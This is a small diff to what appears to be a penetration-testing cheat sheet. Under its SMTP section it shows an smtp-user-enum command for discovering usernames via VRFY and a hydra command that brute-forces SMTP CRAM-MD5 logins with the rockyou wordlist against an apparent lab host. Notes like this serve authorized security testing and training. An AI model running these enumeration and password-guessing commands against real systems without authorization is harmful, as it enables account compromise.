@@ -25,7 +25,7 @@ https://github.com/GDSSecurity/SSH-Weak-DH
 # 25 SMTP
 ```bash
 # find users
-smtp-user-enum -M VRFY -U //usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.11.1.115 -p 25
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET -p 25
 
 # brute force, #auth type from nmap default scripts or telnet > EHLO world
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtp://10.11.1.115/CRAM-MD5
